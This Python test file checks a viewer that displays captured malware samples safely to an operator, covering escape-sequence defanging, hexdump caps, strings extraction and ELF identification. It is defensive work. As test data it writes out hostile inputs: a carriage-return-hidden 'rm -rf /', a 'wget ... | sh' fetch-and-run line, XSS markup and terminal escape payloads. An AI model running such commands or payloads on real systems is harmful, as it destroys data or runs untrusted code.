#!/usr/bin/env python3
"""Check that a sample cannot act on the operator reading it.

The loot viewer puts attacker-chosen bytes on the operator's screen, which is
the one place in this appliance where captured content is rendered rather than
merely stored. Three things stop that being a foothold: control characters are
rewritten here, the page inserts the result with textContent, and the CSP
forbids inline script. This asserts the first, which is the only one a change
to this file could break.

    python3 admin-dashboard/test_safeview.py
"""

import importlib.util
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("safeview", ROOT / "safeview.py")
safeview = importlib.util.module_from_spec(spec)
spec.loader.exec_module(safeview)

ESC = bytes([27])
BEL = bytes([7])
BACKSLASH = bytes([92])

FAILED = 0


def check(label, condition, detail=""):
    global FAILED
    print(("ok   " if condition else "FAIL ") + label
          + ("" if condition or not detail else f"  -- {detail}"))
    if not condition:
        FAILED += 1


print("-- escape sequences --")

# Sparse enough to stay on the text path, which is where defang() runs. A
# denser one goes to hex instead; both are covered, because "it was safe
# because it happened to be classified binary" is not the property wanted.
payload = (b"#!/bin/sh\n# normal looking comment line here\n"
           + ESC + b"[2Jecho hi\n")
result = safeview.view(payload)
check("stays on the text path", result["kind"] == "text", result["kind"])
check("no raw ESC survives", ESC.decode() not in result["content"])
check("ESC is shown as ^[", "^[" in result["content"],
      repr(result["content"][-24:]))

dense = ESC + b"[2J" + ESC + b"]0;title" + BEL + b"\n"
result = safeview.view(dense)
check("a control-dense file goes to hex", result["kind"] == "binary")
check("no raw ESC in the hex view", ESC.decode() not in result["content"])
check("hex view is pure ASCII", all(ord(c) < 0x80 for c in result["content"]))

print("\n-- the carriage-return overwrite --")

result = safeview.view(b"echo harmless\rrm -rf /\n")
check("lone CR does not survive", "\r" not in result["content"],
      repr(result["content"]))
check("the hidden half is visible", "rm -rf /" in result["content"])
check("the decoy half is still visible", "echo harmless" in result["content"])

print("\n-- what must NOT be mangled --")

result = safeview.view(b"#!/bin/sh\n\tcd /tmp || cd /var/run\n")
check("newlines survive", result["content"].count("\n") == 2)
check("tabs survive", "\t" in result["content"])

result = safeview.view(b"#!/bin/sh\n" + BACKSLASH + b"3B is the octal artefact\n")
check("backslashes are untouched", BACKSLASH.decode() in result["content"])

# Returned verbatim on purpose. It is the caller's job not to parse it, and
# quietly stripping markup here would corrupt the evidence being read.
result = safeview.view(b"<script>alert(1)</script>\n<img onerror=x>\n")
check("markup passes through as data", "<script>" in result["content"])
check("markup does not make it binary", result["kind"] == "text")

print("\n-- binary --")

elf = b"\x7fELF\x02\x01\x01\x00" + bytes(range(256))
result = safeview.view(elf)
check("ELF is binary", result["kind"] == "binary")
check("canonical hexdump layout",
      result["content"].startswith("00000000  7f 45 4c 46 02 01 01 00"),
      repr(result["content"][:34]))
check("ASCII column has no raw bytes",
      all(ord(c) < 0x80 for c in result["content"]))

check("a NUL forces binary",
      safeview.view(b"#!/bin/sh\necho hi\x00\n")["kind"] == "binary")
check("gzip is binary", safeview.view(b"\x1f\x8b\x08" + bytes(64))["kind"] == "binary")
check("a plain script is text",
      safeview.view(b"#!/bin/sh\nwget http://x/y -O- | sh\n")["kind"] == "text")

result = safeview.view(b"#!/bin/sh\n", mode="hex")
check("mode=hex overrides the sniff", result["kind"] == "binary")
check("mode is reported back", result["mode"] == "hex")

result = safeview.view(elf, mode="text")
check("mode=text overrides the sniff", result["kind"] == "text")

print("\n-- the hex cap --")

# The bug this exists to prevent: MAX_VIEW_BYTES applied to hex meant a 672KB
# ELF rendered as 16,384 lines and over a megabyte of DOM. Hex identifies a
# file; it is not how anyone reads one.
big = b"\x7fELF\x01\x02\x01\x00" + bytes(range(256)) * 4000
result = safeview.view(big, mode="hex", total_size=len(big))
check("hex is capped independently of MAX_VIEW_BYTES",
      result["bytes_shown"] == safeview.MAX_HEX_BYTES, result["bytes_shown"])
check("which is 16 bytes per line",
      result["lines"] == safeview.MAX_HEX_BYTES // 16, result["lines"])
check("and the cap is far below the text cap",
      safeview.MAX_HEX_BYTES < safeview.MAX_VIEW_BYTES)
check("truncation is still reported", result["truncated"] is True)

print("\n-- strings --")

# The property that makes this safe is structural, not a filter: a run is
# assembled only from bytes in 0x20..0x7E, so no control character can reach
# the output at all. Assert it against a payload that is trying.
hostile = (b"\x00\x00" + ESC + b"[31mANSI\x00"
           + b"/bin/busybox\x00185.220.101.44\x00"
           + BEL + b"evil.example.onion\x00" + bytes(range(32)))
result = safeview.view(hostile, mode="strings", total_size=len(hostile))
check("strings mode is reported", result["kind"].startswith("strings"))
check("no ESC survives", ESC.decode() not in result["content"])
check("no control byte survives at all",
      not any(ord(c) < 0x20 for c in result["content"].replace("\n", "")))
check("real runs are recovered", "/bin/busybox" in result["content"])
check("an IP is recovered", "185.220.101.44" in result["content"])
check("a domain is recovered", "evil.example.onion" in result["content"])

check("runs shorter than MIN_STRING are dropped",
      "abc" not in safeview.view(b"\x00abc\x00", mode="strings")["content"])
check("a run of exactly MIN_STRING is kept",
      "abcd" in safeview.view(b"\x00abcd\x00", mode="strings")["content"])

# Consumed in file order, so a low cap does not trim the tail -- it stops
# before .rodata and reports nothing where there was something.
check("the strings cap leaves room for a real string table",
      safeview.MAX_STRINGS >= 8000, safeview.MAX_STRINGS)
check("strings scans past what the other modes read",
      safeview.MAX_STRINGS_SCAN > safeview.MAX_VIEW_BYTES)

print("\n-- format identification --")

def elf_header(bits, endian, machine, etype=2):
    order = "big" if endian == 2 else "little"
    head = bytearray(b"\x7fELF" + bytes([bits, endian, 1]) + b"\x00" * 9)
    head += etype.to_bytes(2, order) + machine.to_bytes(2, order)
    return bytes(head)

# The exact header of the 672KB sample that motivated all of this.
check("MIPS big-endian, the multi-arch dropper case",
      safeview.describe(elf_header(1, 2, 0x08)) ==
      "ELF 32-bit MIPS big-endian executable",
      safeview.describe(elf_header(1, 2, 0x08)))
check("x86-64 little-endian",
      safeview.describe(elf_header(2, 1, 0x3E)) ==
      "ELF 64-bit x86-64 little-endian executable")
check("ARM", "ARM" in safeview.describe(elf_header(1, 1, 0x28)))
check("AArch64", "AArch64" in safeview.describe(elf_header(2, 1, 0xB7)))
check("an unknown machine does not raise",
      "machine" in safeview.describe(elf_header(1, 1, 0x7777)))
check("PE is named", safeview.describe(b"MZ\x90\x00" + bytes(32)) is not None)
check("a script has no format label",
      safeview.describe(b"#!/bin/sh\necho hi\n") is None)
check("a truncated ELF header does not raise",
      safeview.describe(b"\x7fELF\x01") is None)
check("view reports the format", safeview.view(elf_header(1, 2, 0x08))["format"]
      == "ELF 32-bit MIPS big-endian executable")

print("\n-- truncation is reported, not hidden --")

result = safeview.view(b"A" * 100, total_size=999999)
check("truncated is set", result["truncated"] is True)
check("bytes_shown is what was read", result["bytes_shown"] == 100)
check("size is the size on disk", result["size"] == 999999)

result = safeview.view(b"A" * 100, total_size=100)
check("a whole file is not marked truncated", result["truncated"] is False)

print("\n-- degenerate input does not raise --")

for label, blob in [
    ("empty", b""),
    ("invalid utf-8", b"\xff\xfe\xfd\n"),
    ("every byte value", bytes(range(256))),
    ("high bytes only", b"\x80" * 64),
    ("one NUL", b"\x00"),
    ("a very long single line", b"A" * 300000),
    ("a truncated ELF magic", b"\x7fEL"),
    ("printable run at EOF", b"\x00\x00/bin/busybox"),
]:
    # Every mode, not just the sniffed one: "it was safe because it happened
    # to be classified text" is not the property wanted.
    for mode in ("auto", "text", "hex", "strings"):
        try:
            safeview.view(blob, mode=mode, total_size=len(blob))
            survived = True
        except Exception as exc:                                # noqa: BLE001
            survived = False
            print(f"     raised: {exc!r}")
        check(f"survives {label} ({mode})", survived)

print(f"\n{FAILED} check(s) failed" if FAILED else "\nall checks passed")
sys.exit(1 if FAILED else 0)
